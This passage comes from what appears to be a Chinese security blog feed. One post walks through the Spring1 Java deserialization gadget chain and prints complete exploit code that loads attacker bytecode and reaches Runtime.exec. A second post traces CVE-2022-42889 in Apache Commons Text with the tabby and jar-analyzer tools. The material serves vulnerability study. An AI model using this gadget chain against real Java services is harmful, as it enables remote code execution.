我们使用反射写进去</span><br>        cons.newInstance(typeProviderProxy,TemplatesImpl.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700943894667-6a99d444-3ba0-464d-9bae-6178a334bc7e.png" alt="img"></p><p>可以看见按照预期，接下来应该进入AnnotationInvocationHandler,然后返回TemplatesImpl</p><p>但是还是报错了</p><p><img src="1700944234380-2b8427d3-26f4-41d7-8a78-cdaa1411873f.png" alt="img"></p><p><img src="1700951662980-897b0e97-a3f1-440f-9b29-993fa813c984.png" alt="img"></p><p>显示反射调用的权限问题。</p><p><img src="1700950593525-3c90ee07-e632-4051-87c5-9bff6d50aa22.png" alt="img"></p><p>这个类不能直接实列化。</p><p>所以需要返回这个对象，这里很自然就想起AnnotationInvocationHandler在代理一遍。</p><p>不得不说，世上无难事，有事找大哥，大哥们的花活太强了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br>HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map1.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map1);<br><br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br></code></pre></td></tr></table></figure><p><img src="1700951451894-49094428-e93c-4f44-b5f0-8ed8aaa045d2.png" alt="img"></p><p>这样在this.provider.getType()返回一个SerializableTypeWrapper$TypeProvider对象。</p><p>但是需要的是TemplatesImpl类。</p><p>大哥这里是这样处理的，只能说艺术。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span><br>        <span class="hljs-comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span><br>        <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>        <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span><br><span class="hljs-comment">//        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="hljs-comment">//                new Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br></code></pre></td></tr></table></figure><p>这样既满足SerializableTypeWrapper$TypeProvider.getType()，又能找到newTransformer方法，完成触发。</p><h2 id="0x06-完整利用链"><a href="#0x06-完整利用链" class="headerlink" title="0x06 完整利用链"></a>0x06 完整利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>   SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()<br>      SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>         AnnotationInvocationHandler.invoke()<br>            HashMap.get()<br>      ReflectionUtils.findMethod()<br>      SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>         AnnotationInvocationHandler.invoke()<br>            HashMap.get()<br>      ReflectionUtils.invokeMethod()<br>         Method.invoke()<br>            Templates(Proxy).newTransformer()<br>               AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()<br>                  ObjectFactory(Proxy).getObject()<br>                     AnnotationInvocationHandler.invoke()<br>                        HashMap.get()<br>                  Method.invoke()<br>                     TemplatesImpl.newTransformer()<br>                        TemplatesImpl.getTransletInstance()<br>                           TemplatesImpl.defineTransletClasses()<br>                              TemplatesImpl.TransletClassLoader.defineClass()<br>                                 Pwner*(Javassist-generated).&lt;<span class="hljs-keyword">static</span> init&gt;<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmp.cc;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spring1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        byte[] classBytes = loadRemoteClass(&quot;http://127.0.0.1:8888/cb.class&quot;);</span><br><br>        <span class="hljs-type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;EvilCat.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理</span><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br>        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl</span><br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>                ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject</span><br>        <span class="hljs-comment">// 并且会调用 method.invoke(返回值,args)</span><br>        <span class="hljs-comment">// 此时返回值被我们使用动态代理改为了 TemplatesImpl</span><br>        <span class="hljs-comment">// 接下来需要 method 是 newTransformer()，就可以触发调用链了</span><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br><br>        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span><br>        <span class="hljs-comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span><br>        <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>        <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span><br><span class="hljs-comment">//        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="hljs-comment">//                new Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br><br>        <span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br>        <span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span><br>        <span class="hljs-comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span>   <span class="hljs-operator">=</span> clazz2.getDeclaredField(<span class="hljs-string">&quot;methodName&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(objects, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc7&quot;</span>));<br>            outputStream.writeObject(objects);<br>            outputStream.close();<br><span class="hljs-comment">//</span><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc7&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] loadRemoteClass(String remoteClassUrl) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(remoteClassUrl);<br>        <span class="hljs-type">URLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> url.openConnection();<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> connection.getInputStream();<br>             <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bufferedInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(inputStream);<br>             <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>()) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> bytesRead;<br>            <span class="hljs-keyword">while</span> ((bytesRead = bufferedInputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                outputStream.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>            &#125;<br>            <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>su18 NB</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://su18.org/post/ysoserial-su18-3/#spring1">https://su18.org/post/ysoserial-su18-3/#spring1</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tabby_jar-analyzer_commons-text</title>
    <link href="/2023/12/13/tabby-jar-analyzer-commons-text/"/>
    <url>/2023/12/13/tabby-jar-analyzer-commons-text/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-工具介绍"><a href="#0x01-工具介绍" class="headerlink" title="0x01 工具介绍"></a>0x01 工具介绍</h2><p>​<a href="https://github.com/wh1t3p1g/tabby">https://github.com/wh1t3p1g/tabby</a></p><p>TABBY 是一款针对 Java 语言的静态代码分析工具，相关工作已被接收发表在 The 53rd Annual IEEE&#x2F;IFIP International Conference on Dependable Systems and Networks (DSN 2023)，会议论文录用名单详见<a href="https://dsn2023.dei.uc.pt/program_research.html">DSN2023</a>。</p><p>TABBY使用静态分析框架 <a href="https://github.com/soot-oss/soot">Soot</a> 作为语义提取工具，将JAR&#x2F;WAR&#x2F;CLASS文件转化为代码属性图。 并使用 <a href="https://neo4j.com/">Neo4j</a> 图数据库来存储生成的代码属性图CPG。</p><p>​<a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></p><p><code>Jar Analyzer</code> 是一个分析 <code>Jar</code> 文件的 <code>GUI</code> 工具：</p><ul><li>支持大 <code>Jar</code> 以及批量 <code>Jars</code> 分析 </li><li>方便地搜索方法之间的调用关系 </li><li>分析 <code>LDC</code> 指令定位 <code>Jar</code> 中的字符串 </li><li>一键分析 <code>Spring Controller/Mapping</code> </li><li>对于方法字节码和指令的高级分析 </li><li>一键反编译，优化对内部类的处理 </li><li>一键生成方法的 <code>CFG</code> 分析结果 </li><li>一键生成方法的 <code>Stack Frame</code> 分析结果 </li><li>自定义 <code>SQL</code> 语句进行高级分析</li></ul><h2 id="0x02-漏洞环境Apache-Commons-Text"><a href="#0x02-漏洞环境Apache-Commons-Text" class="headerlink" title="0x02  漏洞环境Apache Commons Text"></a>0x02  漏洞环境Apache Commons Text</h2><p>CVE-2022-42889 Apache Commons Text 1.5 &lt;&#x3D; Apache Commons Text &lt;&#x3D; 1.9</p><p>org.apache.commons.text.lookup.StringLookup 的实例。从 1.5 版到 1.9 版，攻击者可构造恶意文本，使得Apache Commons Text 在解析时执行任意恶意代码。</p><p><a href="https://repo1.maven.org/maven2/org/apache/commons/commons-text/1.9/commons-text-1.9.jar">Apache Commons Text 1.9</a></p><h2 id="0x03-使用jar-ayalyzer分析"><a href="#0x03-使用jar-ayalyzer分析" class="headerlink" title="0x03  使用jar-ayalyzer分析"></a>0x03  使用jar-ayalyzer分析</h2><p><img src="1701542509837-9a932a3a-ed26-435c-8408-8fe6fbcc894c-20231213233843707.png" alt="img"></p><p>导入后点击start engine。</p><p>我们知道CVE-2022-42889主要触发点是lookup调用了ScriptEngine的eval方法造成代码执行。</p><p><img src="1701542516105-69a93177-dab0-416c-a9d3-902fd7de7f50-20231213233844022.png" alt="img"></p><p>在search类别里进行搜索</p><p><img src="1701542521312-680b91da-fa02-47e5-ac1b-ab70b26d2068-20231213233843832.png" alt="img"></p><p>这里可以得到org.apache.commons.text.lookup$lookup方法调用了scriptEngine.eval。然后key可控， script &#x3D; keys[1]，所以慢慢往上走就可以了。</p><p><img src="1701542531309-72c89775-84ca-457d-b133-ea5d0682434b-20231213233845038.png" alt="img"></p><p>在call界面，有caller，callee两个界面。caller表示哪个方法调用了lookup方法，callee表示lookup里调用了什么方法。</p><p><img src="1701542537645-b7dacbd6-0c0d-4f7c-966b-54f7f9dcd6f9-20231213233844376.png" alt="img"></p><p>往上来到了StringLookup接口，上面是调用，下面是实现类。</p><p><img src="1701542541197-20f9c12a-7104-4515-8f69-ff576fd6e1b2-20231213233844930.png" alt="img"></p><p>也可以在impl里面查看接口的实现类。</p><p><img src="1701542545932-beb52cde-85a3-4435-a9ec-92e08bfcc52d-20231213233843996.png" alt="img"></p><p>往上来到了org.apache.commons.text$StringSubstitutor#resolveVariable, 可以看到都可传。</p><p><img src="1701542550368-ec85dbbf-d12e-4022-b707-60eb5a78d099-20231213233844246.png" alt="img"></p><p><img src="1701542554978-536ddcbc-61c3-4db4-9dab-e8aa12e2a0e3-20231213233844229.png" alt="img"></p><p>org&#x2F;apache&#x2F;commons&#x2F;text&#x2F;StringSubstitutor#substitute，之间如果有别的调用，慢慢分析也就有很多其他的触发链，但这个好像并没有</p><p><img src="1701542558672-b87f43ef-b90e-4590-abca-31e0b0ef0b3b-20231213233844510.png" alt="img"></p><p>最后可以看见replace调用。</p><p><img src="1701542563767-4a0c7bd6-1292-4354-9f29-8f515fc89f5d-20231213233844477.png" alt="img"></p><p>都是差不多的处理。</p><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">StringSubstitutor</span> <span class="hljs-variable">stringSubstitutor</span> <span class="hljs-operator">=</span> StringSubstitutor.createInterpolator();<br>stringSubstitutor.replace(<span class="hljs-string">&quot;$&#123;script:javascript:2 + 2&#125;);</span><br></code></pre></td></tr></table></figure><p>整个使用流程下载感觉非常流畅，无脑。许少在ct一年成长的太快，弟弟我就是纯纯脚本小子。</p><p><img src="1701542570434-0b4fb78c-8694-45cd-99c9-35d8434c06c0-20231213233844636.png" alt="img"></p><p>advance里面有设置好漏洞字符，下面还引入gpt还有一个常用工具。哎，人与人差距太大了，要想上个月投ct安抚，简历都没过，真实服了。</p><h2 id="0x04-tabby"><a href="#0x04-tabby" class="headerlink" title="0x04 tabby"></a>0x04 tabby</h2><p>上面已经知道是起点replace。 终点为lookup。</p><p>那只需要一下语句分析得到调用图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542575487-1e835b7e-096e-4015-9b06-fbdb496eec30-20231213233845116.png" alt="img"></p><p>可以看到已经跑出链子。</p><p><img src="1701542579160-c482b5f4-67d3-4492-8530-499b98b739ec-20231213233844768.png" alt="img"></p><p><img src="1701542583735-a0aea128-c837-4bc9-b19f-2f60152eaf5e-20231213233844867.png" alt="img"></p><p>它是一个接口，实现类太多了，继续添加一点规则。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542590366-eed0ec3a-3916-41d7-a28c-3b517ade4090-20231213233845074.png" alt="img"></p><p>可以得到以上图，org.apache.commons.text.lookup.StringLookup是一个接口，其他的lookup方法都是去实现这个方法。所以这里用:ALIAS去修饰。最后我们走到的eval，所以还有写一条&#x2F;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m3:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;eval&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542597132-35cd9765-ccff-4eae-a67b-92bbbfcd1e3c-20231213233845181.png" 